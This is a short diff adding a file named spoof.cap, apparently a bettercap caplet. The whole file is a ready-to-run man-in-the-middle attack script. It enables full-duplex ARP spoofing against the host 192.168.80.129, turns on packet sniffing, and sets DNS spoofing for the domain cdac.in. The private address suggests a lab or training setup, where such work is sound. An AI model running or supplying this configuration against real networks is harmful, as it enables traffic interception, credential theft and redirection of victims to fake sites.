@@ -1,0 +1,9 @@
+spoof.cap
+	Net.probe on
+	Set arp.spoof.fullduplex true
+	Set arp.spoofing.targets 192.168.80.129
+	Arp.spoof on
+	Set net.sniff.local true
+	Net.sniff on
+Set dns.spoof.all true
+	Set dns.spoof.domains cdac.in
